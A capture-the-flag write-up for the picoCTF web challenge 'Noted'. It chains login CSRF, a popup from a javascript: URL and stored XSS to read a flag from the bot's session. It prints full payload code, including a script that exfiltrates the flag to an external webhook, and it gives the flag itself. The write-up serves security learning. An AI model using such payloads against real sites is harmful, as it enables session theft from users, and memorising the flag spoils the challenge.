# Noted

### Problem 

A browser XSS problem that requires us to retrieve a flag from the server's logged in session. The browser does not have internet access.

### Solution

There are 3 hints in this problem: 

```
1. Are you sure I followed all the best practices?
2. There's more than just HTTP(S)!
3. Things that require user interaction normally in Chrome might not require it in Headless Chrome.
```

Deciphering these hints is the key to solving this problem. 

The second hint is the easiest. Since the browser has no internet, we can execute JS on the browser using either the `javascript:` scheme or the `data:` scheme.

The first hint can refer to several things. For example, there is a lack of CSRF protection on register and login, and we can directly inject HTML into the notes page. These 2 facts will aid our solving process. 

The last hint is the most obscure and also a little trivial. Off the top of my head I can name 2 features in Chrome that require user interaction: autoplay and popups. In the beginning I thought I could use the autoplay feature to exploit some kind of RCE in the renderer process and further exploit the lack of sandbox on the chromium instance. However, it turned out popups was the one we were looking for. 

We know we are able to execute JS code on the browser. The only thing that stood in our way was CORS/SOP. Since we are using `javascript:` or `data:` scheme, the origin is treated as `null`, and is thus prevented by accessing the actual website. One way to gain access to the website is to somehow XSS on the actual website. We know we can achieve this using the notes page.

There are 2 ways of approaching this:
1. Attempt to use the browser's logged in session to make a new note. 
2. Create a note and make the browser log in as us. 

Option 1 is unviable because the notes page has something known as CSRF protection, which basically prevents us from programmatically creating a note without XSSing the note creation page, which cannot be done without gaining XSS on the website itself through a note first. 

Option 2 is then our only option. Reading up more about CORS, it turns out that HTML forms can bypass this for web compatibility reasons, and that the only way to prevent this is to use CSRF protection. We noted earlier that the login page lacks CSRF protection. Also note that as soon as we log in as ourselves, we can XSS and then access other windows since we now have the same origin. So with this idea we now know how to read the flag. 

We can use the following steps: 
1. Create a new note yourself that contains an XSS attack. 
2. Send a report to the server
3. On the server, open a popup to notes as the server's logged in user. 
4. Create a form with JS that POSTs to the login page, fill out your credentials, and login. 
5. The page will be redirected to the notes page, which contains your XSS.
6. Using the XSS, access the popup you opened earlier and read the contents, which contains the flag.

Now the only thing that remains is to send the flag back to ourselves. Since we have no internet access, we can use a timing attack and hang/crash the server if we guessed a correct character and keep doing this until we have the entire flag. However, it appears that at the last minute the challenge allowed outbound internet access, so we can simply send the flag to ourselves through something like a Discord webhook. 

Here is my payload: 
URL: 
```js
javascript:{
window.open("http://0.0.0.0:8080/notes", "window");
var form = document.createElement("form");
form.method = "POST";
form.action = "http://0.0.0.0:8080/login";
var element1 = document.createElement("input"); 
var element2 = document.createElement("input");  
element1.value="yes";
element1.name="username";
form.appendChild(element1);  
element2.value="yes";
element2.name="password";
form.appendChild(element2);
document.body.appendChild(form);
form.submit();
}
```
XSS: 
```html
<script>
let win = window.open('', 'window');
let flag = /picoCTF{(.*?)}/.exec(win.document.body.innerHTML)[1];
var request = new XMLHttpRequest();
request.open("POST", "<REDACTED WEBHOOK LINK>");
request.setRequestHeader('Content-type', 'application/json');
var params = {content: flag};
request.send(JSON.stringify(params));
</script>
```

Using this, we can obtain the flag, which is `picoCTF{p00rth0s_parl1ment_0f_p3p3gas_386f0184}`.
